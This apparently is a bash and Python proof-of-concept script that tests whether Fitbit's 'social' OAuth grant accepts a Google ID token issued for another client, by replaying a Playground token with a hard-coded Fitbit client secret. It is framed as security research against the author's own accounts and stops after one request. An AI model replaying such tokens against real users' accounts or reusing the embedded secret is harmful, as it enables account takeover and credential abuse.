#!/data/data/com.termux/files/usr/bin/bash
# g-social.sh — paste the Playground response once; this does the rest.
#
# THE QUESTION
#   Fitbit's `social` grant wants googleUID + googleAccessToken + googleIdToken.
#   A Google ID token carries an `aud` claim naming the OAuth client it was issued
#   FOR. If Fitbit does not check that `aud` is its own client, then an ID token
#   from ANY site with "Sign in with Google" can be replayed into Fitbit —
#   and the published client secret is what lets an outsider call the endpoint at
#   all. That would be account takeover, and the secret is the link that enables it.
#
# SAFETY
#   Both accounts are ours. The Google token below is minted for OUR OWN Google
#   account by Google's own Playground, and the Fitbit account it maps to is OURS.
#   Nobody else is involved. One request. If it succeeds, STOP — do not use the token.
set -u
T="$HOME/.gprobe"; mkdir -p "$T"

echo "Paste the ENTIRE Playground response (from { to }), then press Enter and Ctrl+D:"
cat > "$T/tok.raw"
echo

python3 - "$T/tok.raw" "$T" <<'PY'
import sys,re,base64,json,subprocess
raw=re.sub(r'\s+','',open(sys.argv[1]).read()); T=sys.argv[2]
def grab(k):
    m=re.search(k+r'":"([^"]+)"',raw); return m.group(1) if m else ''
idt, act = grab('id_token'), grab('access_token')
print("  id_token     : %d chars" % len(idt))
print("  access_token : %d chars" % len(act))
if len(idt) < 500 or len(act) < 80:
    print("\n  TOO SHORT — the paste was truncated. Re-copy the whole response and rerun.")
    print("  Nothing was sent. A truncated token would return 'invalid token' and we would")
    print("  wrongly conclude Fitbit validates the audience.")
    sys.exit(1)
p=idt.split('.')[1]; p+='='*(-len(p)%4)
d=json.loads(base64.urlsafe_b64decode(p))
print("\n  --- what this ID token actually is ---")
for k in ('aud','azp','sub','email','email_verified','iss'):
    print("   %-15s %s" % (k, d.get(k)))
aud=str(d.get('aud','')); sub=str(d.get('sub',''))
print("\n  The 'aud' above is the OAuth client this token was issued FOR.")
print("  It is Google's Playground, NOT Fitbit. That is the whole point of the test.")

B=base64.b64encode(b'228TQD:7659f9d9ecc92d6dc1ee0d1774e9744a').decode()
print("\n  --- sending it to Fitbit's social grant (one request) ---")
out=subprocess.run(['curl','-s','--max-time','20','-X','POST',
    'https://api.fitbit.com/oauth2/token',
    '-H','Authorization: Basic '+B,
    '-H','Content-Type: application/x-www-form-urlencoded',
    '--data-urlencode','grant_type=social',
    '--data-urlencode','googleUID='+sub,
    '--data-urlencode','googleAccessToken='+act,
    '--data-urlencode','googleIdToken='+idt],
    capture_output=True,text=True).stdout
print("  "+out[:700])

print("\n  ================= VERDICT =================")
if '"access_token"' in out:
    print("  *** FITBIT ACCEPTED A TOKEN IT DID NOT ISSUE FOR ITSELF ***")
    print("  The aud claim names Google's Playground, not Fitbit, and Fitbit returned a")
    print("  user token anyway. Any site with Sign in with Google could replay a")
    print("  visitor's ID token into Fitbit, authenticating with the published client")
    print("  secret. STOP NOW: run nothing else and call no API with this token. This")
    print("  single response is the whole proof.")
elif 'not linked' in out:
    print("  INCONCLUSIVE — and NOT an audience rejection. Read the message carefully:")
    print("  Fitbit accepted the token, parsed it, pulled the email out of it, and only")
    print("  then stopped because this Google account has no linked Fitbit account.")
    print("  That is a LATER step than token validation. We still have no evidence that")
    print("  the aud claim is checked at all.")
    print()
    print("  To finish: link a Fitbit account to this Google account (log out of Fitbit,")
    print("  log back in with 'Continue with Google'), then rerun. Only then does a")
    print("  success or failure here mean anything.")
elif any(k in out for k in ('invalid_token','audience','client','signature','invalid_grant')):
    print("  REJECTED ON THE TOKEN ITSELF. This is the audience check doing its job, so")
    print("  an ID token from another client cannot be replayed. Path A is closed by")
    print("  test rather than by assumption. Record the exact wording for the write-up.")
else:
    print("  Unrecognised response. Do not guess what it means - paste it back and we")
    print("  work it out before drawing any conclusion.")
PY
